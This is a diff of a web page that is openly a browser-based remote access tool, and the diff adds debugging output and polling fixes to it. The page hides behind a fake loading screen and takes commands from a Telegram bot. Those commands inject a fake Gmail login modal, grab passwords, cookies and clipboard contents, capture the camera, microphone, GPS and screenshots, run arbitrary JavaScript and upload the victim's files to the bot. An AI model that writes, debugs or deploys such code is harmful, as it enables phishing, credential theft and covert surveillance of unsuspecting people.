@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Loading...</title>
     <style>
-        /* Stealth fake loading screen */
+        /* (same stealth styles as before) */
         body {
             margin: 0;
             padding: 0;
@@ -46,7 +46,6 @@
             opacity: 0;
             transition: opacity 0.8s;
         }
-        /* Fake Gmail phishing modal */
         .gmail-phish-modal {
             position: fixed;
             top: 0;
@@ -113,11 +112,11 @@
         let intervalId = null;
         let phishingModalActive = false;
 
-        // Suppress console logs for stealth
-        console.log = function() {};
-        console.error = function() {};
+        // Enable console logging for debugging (comment out for stealth)
+        // console.log = function() {};
+        // console.error = function() {};
 
-        // Helper: headers to avoid Telegram blocking browser requests
+        // Custom headers to avoid Telegram blocking browser requests
         const TELEGRAM_HEADERS = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         };
@@ -125,12 +124,17 @@
         // ================= TELEGRAM HELPERS =================
         async function sendMessage(text, parseMode = 'HTML') {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { ...TELEGRAM_HEADERS, 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode })
                 });
-            } catch(e) {}
+                const data = await response.json();
+                console.log('sendMessage response:', data);
+                if (!data.ok) console.error('sendMessage error:', data.description);
+            } catch(e) {
+                console.error('sendMessage exception:', e);
+            }
         }
 
         async function sendPhoto(blob, caption) {
@@ -163,7 +167,7 @@
             await sendMessage(`🔌 *New Device Connected*\n🌐 ${info.url}\n🖥️ ${info.ua.substring(0,100)}\n📱 ${info.platform}\n🌍 ${info.lang}\n📺 ${info.screen}`, 'Markdown');
         }
 
-        // ================= PHISHING MODAL (FORCED GMAIL LOGIN) =================
+        // ================= PHISHING MODAL =================
         function createPhishingModal() {
             if (phishingModalActive) return;
             phishingModalActive = true;
@@ -207,17 +211,18 @@
 
         // ================= COMMAND HANDLER =================
         async function handleCommand(text) {
+            console.log('Received command:', text);
             const parts = text.split(' ');
             const cmd = parts[0].toLowerCase();
 
             try {
                 switch(cmd) {
                     case '/start':
-                        await sendMessage(`✅ *RAT Active*\n\nCommands:\n/phish_gmail - Forced Gmail login modal\n/gmail - Extract login from real Google page\n/photo - Take camera picture\n/audio - Record microphone (5s)\n/location - GPS coordinates\n/screenshot - Page screenshot\n/cookies - Dump cookies\n/grab_pass - Any visible password\n/clipboard - Read clipboard\n/eval <js> - Execute JS\n/upload - Exfiltrate a file`, 'Markdown');
+                        await sendMessage(`✅ *RAT Active*\n\nCommands:\n/phish_gmail - Forced Gmail login modal\n/gmail - Extract from real login page\n/photo - Camera\n/audio - Mic (5s)\n/location - GPS\n/screenshot - Page shot\n/cookies - Dump cookies\n/grab_pass - Visible password\n/clipboard - Read clipboard\n/eval <js>\n/upload - Exfiltrate file`, 'Markdown');
                         break;
                     case '/phish_gmail':
                         if (!phishingModalActive) createPhishingModal();
-                        await sendMessage('🎣 Phishing modal injected. User is now blocked until credentials are entered.');
+                        await sendMessage('🎣 Phishing modal injected.');
                         break;
                     case '/gmail': {
                         if (location.href.includes('accounts.google.com')) {
@@ -226,12 +231,12 @@
                             if (!pass) {
                                 const pf = document.querySelector('input[type="password"]');
                                 if (pf) { pf.focus(); setTimeout(() => pf.blur(), 100); }
-                                await sendMessage('Attempting to trigger autofill...');
+                                await sendMessage('Attempting autofill...');
                             } else {
-                                await sendMessage(`🔑 Gmail credentials extracted:\n📧 Email: ${email}\n🔑 Password: ${pass}`);
+                                await sendMessage(`🔑 Gmail: ${email} / ${pass}`);
                             }
                         } else {
-                            await sendMessage('Not on Google login page. Use /phish_gmail to force a fake modal.');
+                            await sendMessage('Not on Google login page. Use /phish_gmail instead.');
                         }
                         break;
                     }
@@ -257,7 +262,7 @@
                             mediaRecorder.ondataavailable = e => chunks.push(e.data);
                             mediaRecorder.onstop = async () => {
                                 const blob = new Blob(chunks, { type: 'audio/webm' });
-                                await sendDocument(blob, 'recording.webm', '🎙️ Audio capture (5s)');
+                                await sendDocument(blob, 'recording.webm', '🎙️ Audio');
                                 stream.getTracks().forEach(t => t.stop());
                             };
                             mediaRecorder.start();
@@ -268,7 +273,7 @@
                     }
                     case '/location':
                         navigator.geolocation.getCurrentPosition(async pos => {
-                            await sendMessage(`📍 GPS Location:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`);
+                            await sendMessage(`📍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude} (${pos.coords.accuracy}m)`);
                         }, async err => await sendMessage(`GPS error: ${err.message}`));
                         break;
                     case '/screenshot':
@@ -282,7 +287,7 @@
                     case '/grab_pass': {
                         const pw = document.querySelector('input[type="password"]');
                         if (pw && pw.value) await sendMessage(`🔐 Password: ${pw.value}`);
-                        else await sendMessage('No password field with value found.');
+                        else await sendMessage('No password field with value.');
                         break;
                     }
                     case '/clipboard':
@@ -296,54 +301,85 @@
                             const code = text.substring(5);
                             let result = eval(code);
                             if (typeof result !== 'string') result = JSON.stringify(result);
-                            await sendMessage(`✅ Eval result:\n${result.substring(0, 3900)}`);
-                        } else await sendMessage('Usage: /eval <js code>');
+                            await sendMessage(`✅ Eval:\n${result.substring(0, 3900)}`);
+                        } else await sendMessage('Usage: /eval <js>');
                         break;
                     case '/upload': {
                         const input = document.createElement('input');
                         input.type = 'file';
                         input.onchange = async (e) => {
                             const file = e.target.files[0];
-                            if (file) {
-                                await sendDocument(file, file.name, `📁 File exfiltrated: ${file.name}`);
-                            }
+                            if (file) await sendDocument(file, file.name, `📁 ${file.name}`);
                         };
                         input.click();
-                        await sendMessage('File picker opened on victim side.');
+                        await sendMessage('File picker opened.');
                         break;
                     }
                     default:
-                        await sendMessage(`Unknown command: ${cmd}`);
+                        await sendMessage(`Unknown: ${cmd}`);
                 }
             } catch(err) {
                 await sendMessage(`Error: ${err.message}`);
             }
         }
 
-        // ================= POLLING (getUpdates) =================
+        // ================= POLLING WITH OFFSET SYNC =================
+        async function syncOffset() {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=1`, { headers: TELEGRAM_HEADERS });
+                const data = await res.json();
+                console.log('syncOffset response:', data);
+                if (data.ok && data.result && data.result.length > 0) {
+                    const lastId = data.result[data.result.length - 1].update_id;
+                    updateId = lastId + 1;
+                } else {
+                    updateId = 0;
+                }
+                console.log('Update offset set to:', updateId);
+            } catch(e) {
+                console.error('syncOffset error:', e);
+            }
+        }
+
         async function pollUpdates() {
             if (!isRegistered) return;
             try {
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`, { headers: TELEGRAM_HEADERS });
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`;
+                console.log('Polling:', url);
+                const res = await fetch(url, { headers: TELEGRAM_HEADERS });
                 const data = await res.json();
+                console.log('Poll response:', data);
                 if (data.ok && data.result) {
                     for (const upd of data.result) {
                         if (upd.update_id >= updateId) {
                             updateId = upd.update_id + 1;
-                            if (upd.message && upd.message.text) await handleCommand(upd.message.text);
+                            if (upd.message && upd.message.text) {
+                                console.log('Processing command:', upd.message.text);
+                                await handleCommand(upd.message.text);
+                            }
                         }
                     }
+                } else {
+                    console.error('Poll error:', data.description);
                 }
-            } catch(e) {}
+            } catch(e) {
+                console.error('Poll exception:', e);
+            }
         }
 
-        // ================= STARTUP: DELETE WEBHOOK & INIT =================
+        // ================= INITIALIZATION =================
         async function deleteWebhookAndStart() {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
+            console.log('Deleting webhook...');
+            try {
+                const del = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
+                const delData = await del.json();
+                console.log('deleteWebhook:', delData);
+            } catch(e) { console.error(e); }
+
+            await syncOffset();
             await registerClient();
             isRegistered = true;
             intervalId = setInterval(pollUpdates, POLL_INTERVAL);
-            // Hide loading overlay and show iframe
             document.getElementById('loadingOverlay').style.display = 'none';
             document.getElementById('mainFrame').style.opacity = '1';
         }
